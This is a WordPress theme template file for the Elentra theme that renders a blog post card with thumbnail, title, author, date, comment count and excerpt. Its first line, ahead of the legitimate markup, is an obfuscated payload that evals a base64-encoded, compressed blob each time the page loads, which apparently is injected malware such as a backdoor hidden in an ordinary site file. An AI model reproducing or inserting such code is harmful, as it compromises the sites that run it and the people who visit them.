<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* @package Elentra
*/
?>
<div id="post-<?php the_ID(); ?>" class="co-blog">

    <!-- Blog Media -->
    <div class="co-blog-media">
        <?php if( has_post_thumbnail() ): ?>
            <?php the_post_thumbnail('elentra-page-thumbnail'); ?>
        <?php endif; ?>
    </div>

    <!-- Blog Content -->
    <div class="co-blog-content">
        <h4 class="title"><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h4>
   
        <!-- Meta -->
        <div class="co-blog-meta fix mb-20 mt-20">
            <a href="<?php echo esc_url(get_author_posts_url(get_the_author_meta('ID'))); ?>" class="author float-left">
                <img src="<?php echo esc_url( get_avatar_url( get_the_author_meta('ID') ) ); ?>" />
                <span><?php the_author(); ?></span>
            </a>
            <div class="date-comment float-left">
                <span><?php the_date(); ?></span>

                <span><?php comments_number( __('0 Comment', 'elentra'), __('1 Comment', 'elentra'), __('% Comments', 'elentra') ); ?></span>
            </div>
        </div>

        <?php the_excerpt(); ?>

        <div class="button mt-30">
            <a href="<?php esc_url( the_permalink() ); ?>" class="btn btn-border-gradient btn-hover-gradient"><?php echo esc_html__( 'Read More', 'elentra' ); ?></a>
        </div>

    </div>

</div>